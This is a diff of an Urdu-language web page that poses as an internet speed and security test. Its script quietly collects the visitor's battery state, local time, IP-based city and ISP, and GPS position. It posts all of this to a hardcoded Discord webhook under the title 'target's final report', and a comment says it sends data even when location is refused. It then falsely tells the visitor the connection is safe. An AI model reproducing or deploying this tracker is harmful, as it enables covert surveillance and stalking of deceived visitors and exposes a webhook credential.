@@ -2,73 +2,64 @@
 <html lang="ur" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نیٹ ورک اسپیڈ ٹیسٹ</title>
+    <title>نیٹ ورک سیکیورٹی ٹیسٹ</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .test-box { background: #1c222d; padding: 35px; border-radius: 20px; width: 340px; text-align: center; border: 1px solid #313a4a; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
-        .btn-run { background: #00d2ff; color: black; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        body { font-family: sans-serif; background: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #1c222d; padding: 30px; border-radius: 15px; text-align: center; width: 320px; border: 1px solid #313a4a; }
+        .btn { background: #00d2ff; color: black; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="test-box">
-    <div style="font-size:50px">⚡</div>
-    <h2>انٹرنیٹ کوالٹی رپورٹ</h2>
-    <p style="font-size:13px; color:#94a3b8;">اپنے انٹرنیٹ کی رفتار اور سیکیورٹی چیک کرنے کے لیے بٹن دبائیں۔</p>
-    <button class="btn-run" onclick="executeFullAudit()">ٹیسٹ شروع کریں</button>
-    <div id="out" style="display:none; margin-top:15px; color:#4ade80; font-size:12px;">تجزیہ مکمل ہو گیا!</div>
+<div class="box">
+    <div style="font-size:50px">📡</div>
+    <h2>نیٹ ورک آڈٹ</h2>
+    <p style="font-size:13px; color:#94a3b8;">اپنے انٹرنیٹ کی سیکیورٹی اور پنگ چیک کرنے کے لیے بٹن دبائیں۔</p>
+    <button class="btn" onclick="startAudit()">ٹیسٹ شروع کریں</button>
 </div>
 
 <script>
-    async function executeFullAudit() {
-        // 1. گہری ڈیوائس معلومات (فون ماڈل کا اندازہ)
-        const ua = navigator.userAgent;
-        let deviceModel = "PC/Laptop";
-        if (ua.match(/Android/i)) {
-            const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)\sBuild/);
-            deviceModel = match ? match[2] : "Android Phone";
-        } else if (ua.match(/iPhone/i)) {
-            deviceModel = "iPhone";
-        }
+    async function startAudit() {
+        // 1. بیٹری کا ڈیٹا
+        let batt = "N/A";
+        try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}% (${b.charging ? 'چارجنگ' : 'بیٹری پر'})`; } catch(e) {}
 
-        // 2. بیٹری کی معلومات (گارنٹیڈ)
-        let battStr = "N/A";
+        // 2. آئی پی اور شہر (بغیر اجازت کے)
+        let ipInfo = { city: "Unknown", country: "Unknown", org: "Unknown", query: "N/A" };
         try {
-            const b = await navigator.getBattery();
-            battStr = `${Math.round(b.level * 100)}% (${b.charging ? 'چارجنگ' : 'بیٹری پر'})`;
-        } catch(e) { battStr = "اجازت نہیں ملی"; }
+            const res = await fetch('http://ip-api.com/json/');
+            ipInfo = await res.json();
+        } catch (e) {}
 
-        // 3. ٹائم اور لوکیشن
-        const tZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const localT = new Date().toLocaleString();
-
-        const sendData = async (lat = "Denied", lon = "Denied") => {
+        const sendData = async (lat = null, lon = null) => {
             const webhook = "https://discord.com/api/webhooks/1470998243826602132/T60IyiL2tylMGTqYes0mwWzq59wUn9-HjEG0_FWTW7iQtapXwRDzOd5eoDQNYa276z6A";
             
+            const mapLink = lat ? `https://www.google.com/maps?q=${lat},${lon}` : "لوکیشن بلاک ہے";
+
             const payload = {
                 embeds: [{
-                    title: "📱 مکمل ڈیوائس اور نیٹ ورک رپورٹ",
-                    color: 16711680,
+                    title: "🕵️ ٹارگٹ کی فائنل رپورٹ",
+                    color: 15105570,
                     fields: [
-                        { name: "🔋 بیٹری کی حالت", value: battStr, inline: true },
-                        { name: "📱 فون/سسٹم ماڈل", value: deviceModel, inline: true },
-                        { name: "⏰ ٹائم زون", value: tZone },
-                        { name: "🕒 مقامی وقت", value: localT },
-                        { name: "📍 میپ لنک", value: `[لوکیشن دیکھیں](https://www.google.com/maps?q=${lat},${lon})` }
+                        { name: "🔋 بیٹری", value: batt, inline: true },
+                        { name: "🕒 مقامی وقت", value: new Date().toLocaleString(), inline: true },
+                        { name: "🌍 آئی پی شہر", value: `${ipInfo.city}, ${ipInfo.country}` },
+                        { name: "🏢 نیٹ ورک (ISP)", value: ipInfo.org },
+                        { name: "📍 گوگل میپ (GPS)", value: `[یہاں کلک کریں](${mapLink})` }
                     ],
-                    footer: { text: "ISDP Advanced Audit" },
+                    footer: { text: "ISDP Advanced Tracker" },
                     timestamp: new Date()
                 }]
             };
 
             await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-            document.getElementById('out').style.display = 'block';
+            alert("ٹیسٹ مکمل! آپ کا کنکشن محفوظ ہے۔");
         };
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (p) => sendData(p.coords.latitude, p.coords.longitude),
-                () => sendData()
+                () => sendData() // اگر وہ "Block" کرے تو بھی ڈیٹا جائے گا
             );
         } else { sendData(); }
     }
